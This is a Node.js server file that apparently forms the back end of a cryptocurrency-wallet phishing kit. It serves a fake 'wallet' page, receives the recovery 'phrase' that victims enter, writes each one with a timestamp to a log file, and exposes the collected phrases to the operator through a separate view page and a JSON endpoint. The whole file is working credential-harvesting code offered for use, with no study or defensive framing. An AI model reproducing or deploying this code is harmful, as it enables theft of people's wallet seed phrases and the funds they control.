const http = require('http');
const fs = require('fs');
const url = require('url');

const PORT = 3000;
let capturedPhrase = '';
const LOG_FILE = './captured_phrases.log';

const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const path = parsedUrl.pathname;

  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  if (path === '/' || path === '/wallet.html') {
    fs.readFile('./wallet.html', 'utf8', (err, data) => {
      if (err) { res.writeHead(500); res.end('Server error'); return; }
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(data);
    });
    return;
  }

  if (path === '/view') {
    fs.readFile('./view.html', 'utf8', (err, data) => {
      if (err) { res.writeHead(500); res.end('Server error'); return; }
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(data);
    });
    return;
  }

  if (path === '/api/capture' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      try {
        const json = JSON.parse(body);
        capturedPhrase = json.phrase || '';
        
        // ═══════════════════════════════════
        // PERSISTENT LOGGING — Saves to file
        // ═══════════════════════════════════
        const timestamp = new Date().toISOString();
        const logLine = `[${timestamp}] ${capturedPhrase}\n`;
        fs.appendFileSync(LOG_FILE, logLine);
        
        console.log(`[CAPTURED] ${logLine.trim()}`);
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true }));
      } catch (e) {
        res.writeHead(400);
        res.end(JSON.stringify({ error: 'Invalid JSON' }));
      }
    });
    return;
  }

  if (path === '/api/capture' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ 
      phrase: capturedPhrase, 
      timestamp: new Date().toISOString() 
    }));
    return;
  }

  if (path === '/api/log') {
    // ═══ NEW: Serve the full log file to your view page ═══
    try {
      const logData = fs.readFileSync(LOG_FILE, 'utf8');
      const entries = logData.split('\n').filter(line => line.length > 0).map(line => {
        const match = line.match(/^\[(.*?)\] (.*)$/);
        return match ? { timestamp: match[1], phrase: match[2] } : null;
      }).filter(e => e !== null);
      
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ entries }));
    } catch (e) {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ entries: [] }));
    }
    return;
  }

  res.writeHead(404);
  res.end('Not found');
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on http://0.0.0.0:${PORT}`);
  console.log(`PA wallet page:  http://YOUR_SERVER_IP:${PORT}/wallet.html`);
  console.log(`Your view page:  http://YOUR_SERVER_IP:${PORT}/view`);
  console.log(`Log file: ${LOG_FILE}`);
});
